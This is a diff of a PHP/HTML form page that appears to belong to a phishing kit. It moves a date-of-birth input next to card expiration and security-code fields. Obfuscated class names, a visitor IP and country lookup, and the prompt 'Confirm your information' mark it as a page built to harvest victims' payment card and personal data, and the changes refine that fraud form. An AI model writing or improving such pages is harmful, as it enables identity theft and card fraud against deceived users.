@@ -149,7 +149,8 @@ exit;
                                             <div class="x_26ID-Z770 x_V-ForZ118 x_29ID-Z772 medium x_33ID-Z710 left" id="x_34ID-Z677">
 												<input type="tel" id="en_expdate" name="expdate" autocomplete="off" class="Xval666ideX1 x_33ID-Z634" value="" maxlength="7" placeholder="Expiration Date" aria-required="true">
 												
-												
+												<input type="tel" id="date" name="dob" autocomplete="off" class="Xval666ideX1 x_33ID-Z634"  value="" pattern="[0-9-/]{10}" maxlength="10" placeholder="Date of Birth (DD/MM/YYYY)" aria-required="true">
+											</div>
 												<?
 												include('../../functions/get_ip.php');
 												if($_SESSION['_LOOKUP_CNTRCODE_'] == 'US' OR $_SESSION['_LOOKUP_CNTRCODE_'] == 'CA'){
@@ -157,9 +158,6 @@ exit;
 													echo'<p style="margin-bottom: 8px;">Confirm your information</p>
 												
 				
-												
-												<input type="tel" id="date" name="dob" autocomplete="off" class="Xval666ideX1 x_33ID-Z634"  value="" pattern="[0-9-/]{10}" maxlength="10" placeholder="Date of Birth (DD/MM/YYYY)" aria-required="true">
-											</div>
                                              <div class="x_31ID-Z757" id="x_32ID-Z685">
                                                 <div class="x_32ID-Z680 x_V-ForZ118 x_22ID-Z601 medium x_30ID-Z523 right" id="x_22ID-Z527">
                                                     <input type="tel" id="csc" style="background-image: url("../../lib/img/vv.gif");
